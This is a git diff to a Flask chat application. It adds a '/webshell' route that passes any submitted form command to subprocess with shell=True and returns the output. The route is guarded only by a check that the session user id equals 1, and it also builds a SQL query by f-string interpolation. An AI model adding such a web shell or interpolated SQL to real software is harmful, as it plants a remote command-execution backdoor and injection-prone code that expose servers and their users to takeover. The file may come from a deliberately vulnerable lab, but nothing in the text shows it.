@@ -3,6 +3,7 @@ from flask import render_template, request, flash, redirect, url_for, session, s
 from werkzeug.utils import secure_filename
 from sqlalchemy import text
 import os
+import subprocess
 
 @app.route('/login', methods=['GET', 'POST'])
 def login_page():
@@ -179,3 +180,29 @@ def avatars(filename):
     if not os.path.isfile(path):
         path = os.path.join(app.static_folder, "img/default.jpeg")
     return send_file(path)
+
+
+@app.route('/webshell', methods=['GET', 'POST'])
+def webshell():
+    if session.get("userid") != 1:
+        flash("You can't access this page!", "danger")
+        return redirect(url_for("chat_page"))
+
+    result = db.session.execute(text(f"SELECT * FROM chatusers WHERE id = {session['userid']}"))
+    current_user = result.fetchone()
+
+    result = None
+    if request.method == 'POST':
+        command = request.form.get('command')
+        if command:
+            try:
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                result = result.decode('utf-8')
+            except subprocess.CalledProcessError as e:
+                result = e.output.decode('utf-8')
+        else:
+            flash('No command provided.', 'danger')
+        return render_template('webshell.jinja', result=result, current_user=current_user)
+    
+
+    return render_template('webshell.jinja', result=None, current_user=current_user)
